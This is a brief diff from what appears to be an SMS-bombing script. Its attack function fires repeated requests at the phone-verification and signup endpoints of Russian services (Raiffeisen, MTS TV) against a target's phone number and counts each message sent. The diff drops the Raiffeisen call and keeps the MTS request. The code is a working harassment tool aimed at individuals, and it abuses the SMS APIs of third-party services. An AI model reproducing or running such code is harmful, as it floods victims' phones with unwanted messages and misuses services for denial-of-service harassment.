@@ -137,12 +137,6 @@ def attack(number, sms):
 		time(sent)
 		check(sent, sms)
 		
-		raiffeisen = requests.get('https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code', params={'number':number_7})
-		
-		sent += 1
-		time(sent)
-		check(sent, sms)
-		
 		mts = requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': number_7}, headers={})
 		
 		sent += 1
